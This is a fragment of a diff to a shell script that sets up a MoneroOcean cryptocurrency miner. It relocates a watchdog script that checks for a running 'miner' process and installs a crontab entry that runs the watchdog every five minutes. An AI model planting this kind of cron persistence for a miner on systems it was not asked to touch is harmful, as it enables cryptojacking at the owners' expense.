@@ -57,7 +57,7 @@ chmod +x $HOME/moneroocean/mine_grin32.sh
 chmod +x $HOME/moneroocean/miner
 
 
-cat >/tmp/checkminner.sh <<EOL
+cat >/moneroocean/checkminner.sh <<EOL
 #!/bin/bash
 if (( $(ps -ef | awk '{ print $8 }' | grep miner | wc -l) > 0 ))
  then
@@ -70,6 +70,6 @@ if (( $(ps -ef | awk '{ print $8 }' | grep miner | wc -l) > 0 ))
  
 EOL
 
-chmod +x /tmp/checkminner.sh
-(crontab -l 2>/dev/null || true; echo "*/5 * * * * sh /tmp/checkminner.sh") | crontab -
+chmod +x /moneroocean/checkminner.sh
+(crontab -l 2>/dev/null || true; echo "*/5 * * * * sh /moneroocean/checkminner.sh") | crontab -
 
